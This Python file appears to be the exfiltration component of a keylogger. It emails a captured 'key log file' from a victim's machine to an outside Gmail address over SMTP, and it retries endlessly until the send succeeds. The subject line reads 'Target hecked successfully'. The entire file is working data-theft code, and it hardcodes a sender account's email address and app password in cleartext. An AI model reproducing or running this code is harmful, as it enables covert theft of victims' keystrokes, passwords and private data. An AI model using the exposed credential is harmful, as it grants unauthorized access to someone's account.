import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def send_email(sender_email, sender_password, receiver_email, subject, message, attachment_path):
    # Create a multipart message container
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

    # Add message body
    msg.attach(MIMEText(message, 'plain'))

    # Open the file in bynary
    with open(attachment_path, 'rb') as attachment:
        # Add file as application/octet-stream
        # Email clients will usually recognize this as an attachment
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send by email
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename= {attachment_path}')

    # Add attachment to the message and convert it to string
    msg.attach(part)

    # Connect to the SMTP server and send the email
    Success = False
    while not Success:
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587, timeout=120)
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver_email, msg.as_string())
            server.quit()
            Success = True
            print("Email sent successfully.")
        except Exception as e:
            print("Failed to send email due to a network error, Resending...")


def send_file(path):
    sender_email = 'hecker.heck504@gmail.com'        # your email address
    # email password: needs to be an app password since in 2022 google stopped less secure apps from using the general password
    # to setup an app password you need 2FA enabled
    # check out https://support.google.com/accounts/answer/185833?visit_id=638292779507737271-2677340316&p=InvalidSecondFactor&rd=1
    sender_password = 'gwgcbqjtiwjkllep'     

    receiver_email = 'yousif.infinix@gmail.com'  # recipient's email address
    subject = 'Target hecked successfully'
    message = "I'm a genius hecker."
    attachment_path = path     # path to key log file

    send_email(sender_email, sender_password, receiver_email, subject, message, attachment_path)